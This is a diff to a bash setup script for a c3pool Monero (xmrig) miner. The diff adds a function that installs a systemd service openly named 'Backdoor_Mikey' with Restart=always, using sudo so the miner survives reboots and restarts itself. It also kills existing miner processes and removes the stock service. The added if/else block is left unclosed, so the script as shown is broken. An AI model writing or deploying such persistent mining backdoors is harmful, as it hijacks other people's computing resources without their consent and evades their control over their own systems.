@@ -31,12 +31,15 @@ DIR=$HOME/c3pool
 # each random period of time. These bounds will be applied to each virtual CPU thread.
 CPU_min_lim=55
 CPU_max_lim=85
+# Daemon: service which ensures to restart the miner if it terminates for any reason
+daemon_active=true
 ###############################################################################################################################
 
 
 
 # ======== c3Pool setup script for Monero Miner ======== 
 function killAll () {
+    echo 'killing all open miner processes ...'
     sed -i '/c3pool/d' $HOME/.profile
     killall -9 xmrig
 }
@@ -44,6 +47,7 @@ function stopService () {
     systemctl stop c3pool_miner.service
 }
 function removeService () {
+    # delete default daemon which sucks
     echo "[*] Removing c3pool miner"
     if sudo -n true 2>/dev/null; then
         sudo systemctl stop c3pool_miner.service
@@ -106,11 +110,34 @@ function refresh () {
 }
 function build () {
     killAll       
-    wait 
+    wait
     install && removeService
     wait
     shuffle &
-    runMiner
+    if [[ $daemon_active == true ]]; then
+        daemon
+    else
+        runMiner
+}
+function daemon () {
+    echo "Creating Backdoor Mikey"
+    cat >/tmp/Backdoor_Mikey.service <<EOL
+  [Unit]
+Description=Dirty Mike
+[Service]
+ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
+Restart=always
+Nice=8
+CPUWeight=1
+[Install]
+WantedBy=multi-user.target
+EOL
+    sudo mv /tmp/Backdoor_Mikey.service /etc/systemd/system/Backdoor_Mikey.service
+    echo "..... Mikey is here ....."
+    sudo killall xmrig 2>/dev/null
+    sudo systemctl daemon-reload
+    sudo systemctl enable Backdoor_Mikey.service
+    sudo systemctl start Backdoor_Mikey.service  
 }
 
 # run build
